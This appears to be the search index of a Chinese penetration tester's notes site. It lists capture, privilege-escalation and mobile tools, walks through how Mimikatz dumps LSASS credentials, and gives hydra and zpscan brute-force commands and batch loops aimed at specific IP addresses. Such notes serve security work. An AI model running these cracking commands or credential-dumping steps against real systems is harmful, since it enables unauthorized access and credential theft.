Whistle","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85/#burp","text":"\u4e0d\u89e3\u91ca","title":"Burp"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85/#yakit","text":"\u63d2\u4ef6\u4e30\u5bcc\uff0c\u754c\u9762\u53cb\u597d\u7684\u7f1d\u5408\u602a","title":"yakit"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85/#whistle","text":"web\u7aef\u6293\u5305 \u7b2c\u4e00\u6b21\u7528\u662f\u62ff\u6765\u914d\u5408clash\u6293\u5fae\u4fe1\u6d41\u91cf\u7684\uff0c\u56e0\u4e3aclash+burp\u5728macos\u4f1a\u56e0\u4e3a\u8bc1\u4e66\u95ee\u9898\u6253\u4e0d\u5f00\u7f51\u7ad9\u3002 \u53ea\u80fd\u5f53\u66ff\u4ee3\u54c1","title":"Whistle"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E6%8F%90%E6%9D%83/%E6%8F%90%E6%9D%83/","text":"\u63d0\u6743 potato https://github.com/BeichenDream/BadPotato https://github.com/BeichenDream/GodPotato https://github.com/BeichenDream/PrintNotifyPotato","title":"\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E6%8F%90%E6%9D%83/%E6%8F%90%E6%9D%83/#_1","text":"","title":"\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E6%8F%90%E6%9D%83/%E6%8F%90%E6%9D%83/#potato","text":"https://github.com/BeichenDream/BadPotato https://github.com/BeichenDream/GodPotato https://github.com/BeichenDream/PrintNotifyPotato","title":"potato"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E6%96%B0%E9%A1%B5%E9%9D%A2/%E6%96%B0%E9%A1%B5%E9%9D%A2/","text":"\u65b0\u9875\u9762","title":"\u65b0\u9875\u9762"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E6%96%B0%E9%A1%B5%E9%9D%A2/%E6%96%B0%E9%A1%B5%E9%9D%A2/#_1","text":"","title":"\u65b0\u9875\u9762"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/","text":"\u7206\u7834 \u76ee\u5f55 ssh ssh\u5bc6\u7801 fscan orbitaldump hydra socks5 hydra mongodb zpscan fscan RDP zpscan mssql zpscan mysql zpscan Redis zpscan \u5bc6\u7801\u751f\u6210 ssh ssh\u5bc6\u7801 https://github.com/NewBee119/ssh-scanner.git fscan fscan\u662f\u53ef\u4ee5\u624b\u52a8ssh\u7206\u7834\u7684\uff0c\u53ea\u662f\u6548\u679c\u4e0d\u592a\u7406\u60f3 ./fscan -m ssh orbitaldump pip install -U --user orbitaldump python -m orbitaldump python -m orbitaldump -t 10 -u usernames.txt -p passwords.txt -h example.com --proxies hydra hydra\u662f\u7206\u7834\u795e\u5947\uff0c\u4f46\u662f\u7206\u7834ssh\u9700\u8981\u989d\u5916\u5b89\u88c5\u6a21\u5757\uff0c\u6709\u70b9\u9ebb\u70e6\u3002\u5907\u7528 socks5 hydra ./hydra -L ~/Documents/security/tools/zidian/username_deafult.txt -P ~/Documents/security/tools/zidian/Top50.txt socks5://116.162.51.88:8001 mongodb zpscan ./zpscan_darwin crack -i \"180.184.70.193:3717|mongodb\" \u6279\u91cf\u811a\u672c while IFS= read -r line do ./zpscan_darwin crack -i \"${line}|mongodb\" done < \"/Users/CONST27/Documents/project/honglan/9.25/mongodb.txt\" fscan \u4e0d\u5982zpscan+bash\u811a\u672c RDP zpscan ./zpscan_darwin crack -i \"180.184.70.193:3389|rdp\" \u6279\u91cf\u811a\u672c while IFS= read -r line do ./zpscan_darwin crack -i \"${line}|rdp\" done < \"/Users/CONST27/Documents/project/honglan/9.25/rdp.txt\" mssql zpscan ./zpscan_darwin crack -i \"180.184.70.193:1433|mssql\" while IFS= read -r line do ./zpscan_darwin crack -i \"${line}|mssql\" done < \"/Users/CONST27/Documents/project/honglan/9.25/mssql_url.txt\" mysql zpscan Redis zpscan \u5bc6\u7801\u751f\u6210 https://github.com/sry309/PwdBUD.git","title":"\u7206\u7834"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#_1","text":"","title":"\u7206\u7834"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#_2","text":"ssh ssh\u5bc6\u7801 fscan orbitaldump hydra socks5 hydra mongodb zpscan fscan RDP zpscan mssql zpscan mysql zpscan Redis zpscan \u5bc6\u7801\u751f\u6210","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#ssh","text":"","title":"ssh"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#ssh_1","text":"https://github.com/NewBee119/ssh-scanner.git","title":"ssh\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#fscan","text":"fscan\u662f\u53ef\u4ee5\u624b\u52a8ssh\u7206\u7834\u7684\uff0c\u53ea\u662f\u6548\u679c\u4e0d\u592a\u7406\u60f3 ./fscan -m ssh","title":"fscan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#orbitaldump","text":"pip install -U --user orbitaldump python -m orbitaldump python -m orbitaldump -t 10 -u usernames.txt -p passwords.txt -h example.com --proxies","title":"orbitaldump"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#hydra","text":"hydra\u662f\u7206\u7834\u795e\u5947\uff0c\u4f46\u662f\u7206\u7834ssh\u9700\u8981\u989d\u5916\u5b89\u88c5\u6a21\u5757\uff0c\u6709\u70b9\u9ebb\u70e6\u3002\u5907\u7528","title":"hydra"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#socks5","text":"","title":"socks5"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#hydra_1","text":"./hydra -L ~/Documents/security/tools/zidian/username_deafult.txt -P ~/Documents/security/tools/zidian/Top50.txt socks5://116.162.51.88:8001","title":"hydra"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#mongodb","text":"","title":"mongodb"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#zpscan","text":"./zpscan_darwin crack -i \"180.184.70.193:3717|mongodb\" \u6279\u91cf\u811a\u672c while IFS= read -r line do ./zpscan_darwin crack -i \"${line}|mongodb\" done < \"/Users/CONST27/Documents/project/honglan/9.25/mongodb.txt\"","title":"zpscan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#fscan_1","text":"\u4e0d\u5982zpscan+bash\u811a\u672c","title":"fscan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#rdp","text":"","title":"RDP"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#zpscan_1","text":"./zpscan_darwin crack -i \"180.184.70.193:3389|rdp\" \u6279\u91cf\u811a\u672c while IFS= read -r line do ./zpscan_darwin crack -i \"${line}|rdp\" done < \"/Users/CONST27/Documents/project/honglan/9.25/rdp.txt\"","title":"zpscan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#mssql","text":"","title":"mssql"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#zpscan_2","text":"./zpscan_darwin crack -i \"180.184.70.193:1433|mssql\" while IFS= read -r line do ./zpscan_darwin crack -i \"${line}|mssql\" done < \"/Users/CONST27/Documents/project/honglan/9.25/mssql_url.txt\"","title":"zpscan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#mysql","text":"","title":"mysql"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#zpscan_3","text":"","title":"zpscan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#redis","text":"","title":"Redis"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#zpscan_4","text":"","title":"zpscan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%88%86%E7%A0%B4/%E7%88%86%E7%A0%B4/#_3","text":"https://github.com/sry309/PwdBUD.git","title":"\u5bc6\u7801\u751f\u6210"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/","text":"\u79fb\u52a8\u7aef \u76ee\u5f55 app AppinfoScan adb \u5fae\u4fe1 secretfinder app AppinfoScan https://github.com/kelvinBen/AppInfoScanner \u68c0\u6d4b\u662f\u5426\u52a0\u58f3+URL\u5730\u5740\u3001IP\u5730\u5740\u3001\u5173\u952e\u5b57\u7b49\u4fe1\u606f\u7684\u91c7\u96c6+\u90e8\u5206\u58f3\u81ea\u52a8\u8131\u58f3 adb \u7528\u4e8e\u8fde\u63a5\u5b89\u5353\u7684shell \u5fae\u4fe1 secretfinder https://github.com/m4ll0k/SecretFinder.git \u5728js\u6587\u4ef6\u4e2d\u5bfb\u627e\u654f\u611f\u4fe1\u606f\uff0c\u5c0f\u7a0b\u5e8f\u89e3\u5305\u540e\u6709\u5f88\u591ajs\uff0c\u7528\u8fd9\u4e2a\u5c31\u80fd\u6279\u91cf\u627e\u654f\u611f\u6570\u636e\u54af","title":"\u79fb\u52a8\u7aef"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/#_1","text":"","title":"\u79fb\u52a8\u7aef"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/#_2","text":"app AppinfoScan adb \u5fae\u4fe1 secretfinder","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/#app","text":"","title":"app"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/#appinfoscan","text":"https://github.com/kelvinBen/AppInfoScanner \u68c0\u6d4b\u662f\u5426\u52a0\u58f3+URL\u5730\u5740\u3001IP\u5730\u5740\u3001\u5173\u952e\u5b57\u7b49\u4fe1\u606f\u7684\u91c7\u96c6+\u90e8\u5206\u58f3\u81ea\u52a8\u8131\u58f3","title":"AppinfoScan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/#adb","text":"\u7528\u4e8e\u8fde\u63a5\u5b89\u5353\u7684shell","title":"adb"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/#_3","text":"","title":"\u5fae\u4fe1"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/#secretfinder","text":"https://github.com/m4ll0k/SecretFinder.git \u5728js\u6587\u4ef6\u4e2d\u5bfb\u627e\u654f\u611f\u4fe1\u606f\uff0c\u5c0f\u7a0b\u5e8f\u89e3\u5305\u540e\u6709\u5f88\u591ajs\uff0c\u7528\u8fd9\u4e2a\u5c31\u80fd\u6279\u91cf\u627e\u654f\u611f\u6570\u636e\u54af","title":"secretfinder"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/%E7%A0%94%E7%A9%B6/","text":"\u7814\u7a76 Mimikatz\u5206\u6790 powershell\u811a\u672c\u7684\u5206\u6790","title":"\u7814\u7a76"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/%E7%A0%94%E7%A9%B6/#_1","text":"Mimikatz\u5206\u6790 powershell\u811a\u672c\u7684\u5206\u6790","title":"\u7814\u7a76"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/","text":"Mimikatz\u5206\u6790 \u76ee\u5f55 \u4ece\u8f93\u5165\u547d\u4ee4\u5230privilege::debug mimikatz\u4e2d\u51fa\u73b0\u8fc7\u7684\u7279\u6b8a\u8bed\u6cd5 ((LONG)(LONG_PTR)&(((type *)0)->field)) mimikatz\u5e38\u89c1API kull_m_memory_copy rekurlsa logonpasswords \u521d\u59cb\u5316\u5404\u79cd\u53d8\u91cf\uff0c\u5e76\u8c03\u7528kuhl_m_sekurlsa_acquireLSA\u65b9\u6cd5 kuhl_m_sekurlsa_acquireLSA \u521d\u59cb\u5316\u53d8\u91cf\u5e76\u83b7\u53d6LSASS\u8fdb\u7a0b\u53e5\u67c4 kuhl_m_sekurlsa_acquireLSA \u5411cLsass\u5199\u5165\u7248\u672c\u4fe1\u606f kuhl_m_sekurlsa_acquireLSA \u751f\u6210CNG\u53e5\u67c4 kuhl_m_sekurlsa_acquireLSA \u6838\u5fc3\u90e8\u5206 \u626b\u63cflsass\u8fdb\u7a0bLDR\u94fe\u83b7\u53d6DLL\u4fe1\u606f \u901a\u8fc7lsasrv.dll\u83b7\u53d6\u767b\u5f55\u4f1a\u8bdd \u4e00\u4e9b\u4e0d\u592a\u91cd\u8981\u7684\u4ee3\u7801\u5c31\u7528\u56fe\u4ee3\u66ff\u4e86\u3002 \u4ece\u8f93\u5165\u547d\u4ee4\u5230privilege::debug \u7a0b\u5e8f\u5f00\u542f\uff0c\u8fdb\u5165wmain\u51fd\u6570 \u3002 \u5148\u8c03\u7528\u4e00\u4e2amimikatz_begin \u8f93\u51falogo\u4ee5\u53ca\u505a\u4e00\u4e9b\u57fa\u672c\u7684\u51c6\u5907\u5de5\u4f5c\uff08\u5177\u4f53\u662f\u5565\u51c6\u5907\u5de5\u4f5c\u5c31\u4e0d\u7ba1\u4e86\uff09 wmain\u4e2d\u5f80\u4e0b\uff0c\u8c03\u7528mimikatz_dispatchCommand \u5e76\u4f20\u5165\u8f93\u5165mimikatz\u7684\u53c2\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u68c0\u6d4b\u8f93\u5165\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u4e3a!\u6216\u8005*\u6216\u8005\u5176\u4ed6\uff0c\u7136\u540e\u4f7f\u903b\u8f91\u8fdb\u5165\u4e0b\u4e00\u5c42\u3002\u4e00\u822c\u6765\u8bf4\uff0cmimikatz\u4e2d\u6211\u4eec\u8f93\u5165\u7684\u547d\u4ee4\u7b2c\u4e00\u4e2a\u5b57\u7b26\u90fd\u4e0d\u662f!\u6216\u8005*\uff0c\u6240\u4ee5\u4f1a\u628a\u6211\u4eec\u7684\u8f93\u5165\u4f20\u5165mimikatz_doLocal\u8fdb\u884c\u4e00\u4e2a\u5904\u7406\u3002 \u8fd9\u4e2a\u51fd\u6570\u4f1a\u5148\u5c06\u8f93\u5165\u7684\u5b57\u7b26\u5206\u4e3amodule\u548ccommand\u4e24\u90e8\u5206\uff0cmoudule\u5c31\u662f::\u524d\u7684\u90e8\u5206\uff0ccommand\u5c31\u662f::\u540e\u7684\u90e8\u5206\u3002\uff08privilege::debug privilege\u662fmodule,debug\u662fcommand\uff09\u3002\u7136\u540e\u5faa\u73af\u904d\u5386mimikatz_modlues\u7ed3\u6784\u4f53\uff0c\u76f4\u5230\u627e\u5230\u5bf9\u5e94\u7684module\u4e2d\u5bf9\u5e94\u7684command\uff0c\u7136\u540e\u6267\u884c\u5176pCommand\u65b9\u6cd5\u3002 \u4e00\u4e2amimikatz_modlues\u7ed3\u6784\u4f53\u7684\u5e03\u5c40\u5982\u4e0b\uff0c\u8fd9\u91cc\u4ee5privilege\u4e3a\u4f8b\u3002 privilege::debug\u4f1a\u8c03\u7528kuhl_m_privilege_debug\u65b9\u6cd5\uff0c\u5176\u6838\u5fc3\u4fbf\u662f\u901a\u8fc7RtlAdjustPrivilege\u51fd\u6570\u83b7\u53d6SeDebugPrivilege\u6743\u3002 TSTATUS kuhl_m_privilege_debug(int argc, wchar_t * argv[]) { return kuhl_m_privilege_simple(SE_DEBUG); \\\\SE_DEBUG\u7684\u503c\u662f\u5b9a\u4e49\u597d\u768420\uff0c\u5373SeDebugPrivilege\u5bf9\u5e94\u7684\u6743\u9650\u53c2\u6570\u3002 } NTSTATUS kuhl_m_privilege_simple(ULONG privId) { ULONG previousState; NTSTATUS status = RtlAdjustPrivilege(privId, TRUE, FALSE, &previousState); \\\\\u4e3a\u5f53\u524d\u8fdb\u7a0b\u83b7\u53d6SeDebugPrivilege\u6743\u9650 if(NT_SUCCESS(status)) kprintf(L\"Privilege \\'%u\\' OK\\n\", privId); else PRINT_ERROR(L\"RtlAdjustPrivilege (%u) %08x\\n\", privId, status); return status; } \u8fd9\u91cc\u5b83\u7528\u5230\u4e86\u4e00\u4e2a\u5173\u952eAPI \uff0cRtlAdjustPrivilege\u3002\u8fd9\u4e2aAPI\u6ca1\u6709\u5b98\u65b9\u89e3\u91ca\uff0c\u4f46\u662f\u6839\u636e\u6c11\u95f4\u7684\u6d4b\u8bd5\uff0c\u5b83\u5177\u6709\u63d0\u6743\u529f\u80fd\u3002 NTSTATUS RtlAdjustPrivilege ( ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled ) Privilege [In] Privilege index to change. // \u6240\u9700\u8981\u7684\u6743\u9650\u540d\u79f0\uff0c\u53ef\u4ee5\u5230 MSDN \u67e5\u627e\u5173\u4e8e Process Token & Privilege \u5185\u5bb9\u53ef\u4ee5\u67e5\u5230 Enable [In] If TRUE, then enable the privilege otherwise disable. // \u5982\u679c\u4e3aTrue \u5c31\u662f\u6253\u5f00\u76f8\u5e94\u6743\u9650\uff0c\u5982\u679c\u4e3aFalse \u5219\u662f\u5173\u95ed\u76f8\u5e94\u6743\u9650 CurrentThread [In] If TRUE, then enable in calling thread, otherwise process. // \u5982\u679c\u4e3aTrue \u5219\u4ec5\u63d0\u5347\u5f53\u524d\u7ebf\u7a0b\u6743\u9650\uff0c\u5426\u5219\u63d0\u5347\u6574\u4e2a\u8fdb\u7a0b\u7684\u6743\u9650 Enabled [Out] Whether privilege was previously enabled or disabled. // \u8f93\u51fa\u539f\u6765\u76f8\u5e94\u6743\u9650\u7684\u72b6\u6001\uff08\u6253\u5f00 | \u5173\u95ed\uff09, \u6ce8\u610f\uff1a\u8be5\u53c2\u6570\u8d4b\u4e88\u7a7a\u6307\u9488\u4f1a\u51fa\u9519\uff0c\u6211\u6d4b\u8bd5\u8fc7\u3002 \u8fd4\u56de\u503c\u5927\u4e8e\u7b49\u4e8e0\u4ee3\u8868\u6210\u529f\u83b7\u5f97\u6743\u9650\uff0c\u5c0f\u4e8e0\u4ee3\u8868\u83b7\u53d6\u6743\u9650\u5931\u8d25\u3002 mimikatz\u4e2d\u51fa\u73b0\u8fc7\u7684\u7279\u6b8a\u8bed\u6cd5 ((LONG)(LONG_PTR)&(((type *)0)->field)) \u8fd9\u91cc\u7684type\u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0cfield\u662f\u7ed3\u6784\u4f53\u4e2d\u7684\u4e00\u4e2a\u6570\u636e\u7c7b\u578b\uff0c\u901a\u8fc7\u8fd9\u4e2a\u8bed\u53e5\u53ef\u4ee5\u5f97\u77e5field\u7684\u5728\u7ed3\u6784\u4f53\u4e2d\u7684\u504f\u79fb\u91cf \u201cANSI C\u6807\u51c6\u5141\u8bb8\u503c\u4e3a0\u7684\u5e38\u91cf\u88ab\u5f3a\u5236\u8f6c\u6362\u6210\u4efb\u4f55\u4e00\u79cd\u7c7b\u578b\u7684\u6307\u9488\uff0c \u5e76\u4e14\u8f6c\u6362\u7ed3\u679c\u662f\u4e00\u4e2aNULL\u6307\u9488\uff0c\u56e0\u6b64((type *)0)\u7684\u7ed3\u679c\u5c31\u662f\u4e00\u4e2a\u7c7b\u578b\u4e3atype *\u7684NULL\u6307\u9488\u3002 \u5982\u679c\u5229\u7528\u8fd9\u4e2aNULL\u6307\u9488\u6765\u8bbf\u95eetype\u7684\u6210\u5458\u5f53\u7136\u662f\u975e\u6cd5\u7684\uff0c \u4f46&( ((type *)0)->field )\u7684\u610f\u56fe\u4ec5\u4ec5\u662f\u8ba1\u7b97field\u5b57\u6bb5\u7684\u5730\u5740\u3002 \u806a\u660e\u7684\u7f16\u8bd1\u5668\u6839\u672c\u5c31\u4e0d\u751f\u6210\u8bbf\u95eetype\u7684\u4ee3\u7801\uff0c \u800c\u4ec5\u4ec5\u662f\u6839\u636etype\u7684\u5185\u5b58\u5e03\u5c40\u548c\u7ed3\u6784\u4f53\u5b9e\u4f8b\u9996\u5740\u5728\u7f16\u8bd1\u671f\u8ba1\u7b97\u8fd9\u4e2a\uff08\u5e38\u91cf\uff09\u5730\u5740\uff0c \u8fd9\u6837\u5c31\u5b8c\u5168\u907f\u514d\u4e86\u901a\u8fc7NULL\u6307\u9488\u8bbf\u95ee\u5185\u5b58\u7684\u95ee\u9898\u3002 \u53c8\u56e0\u4e3a\u9996\u5740\u4e3a0\uff0c\u6240\u4ee5\u8fd9\u4e2a\u5730\u5740\u7684\u503c\u5c31\u662f\u5b57\u6bb5\u76f8\u5bf9\u4e8e\u7ed3\u6784\u4f53\u57fa\u5740\u7684\u504f\u79fb\u3002 \u4ee5\u4e0a\u65b9\u6cd5\u907f\u514d\u4e86\u5b9e\u4f8b\u5316\u4e00\u4e2atype\u5bf9\u8c61\uff0c\u5e76\u4e14\u6c42\u503c\u5728\u7f16\u8bd1\u671f\u8fdb\u884c\uff0c\u6ca1\u6709\u8fd0\u884c\u671f\u8d1f\u62c5\u201d mimikatz\u5e38\u89c1API kull_m_memory_copy BOOL kull_m_memory_copy(OUT PKULL_M_MEMORY_ADDRESS Destination, IN PKULL_M_MEMORY_ADDRESS Source, IN SIZE_T Length) \u6839\u636eDestination\u548cSource\u7684type\uff0c\u91c7\u53d6\u4e0d\u540c\u7684\u884c\u52a8\uff0c\u5927\u81f4\u4e0a\u662f\u628aSource\u4e2d\u7684\u67d0\u503c\u653e\u5165Destination\u67d0\u5904\u3002 \u6bd4\u8f83\u5e38\u89c1\u7684type\u7ec4\u5408\u4e3aDestination\u4e3aKULL_M_MEMORY_TYPE_OWN\uff0cSource\u4e3aKULL_M_MEMORY_TYPE_PROCESS\u3002 \u8fd9\u6837\u5c31\u4f1a\u628aSource->hMemory->pHandleProcess->hProcess \uff08\u6307\u5b9a\u7684\u67d0\u8fdb\u7a0b\u53e5\u67c4\uff09\u504f\u79fbSource->address\uff08\u8fdb\u7a0b\u4e2d\u7684\u504f\u79fb\u91cf\uff09\u5904\u83b7\u5f97\u7684\u5730\u5740\u653e\u5165Destination->address \uff0c\u4f8b\u5982\u5c06lsass\u8fdb\u7a0b\u53e5\u67c4\u504f\u79fb\u5230PEB\u540e\u7684\u5185\u5bb9\u653e\u5165Destination.address\u6307\u9488\u6240\u6307\u533a\u57df rekurlsa logonpasswords rekurlas::logonpasswords,mimikatz\u6700\u5e38\u7528\u5230\u7684\u547d\u4ee4\u4e4b\u4e00\uff0c\u7528\u4e8e\u4eceLSA\u4e2ddump\u51fa\u660e\u6587\u5bc6\u7801\u6216\u8005hash\u3002 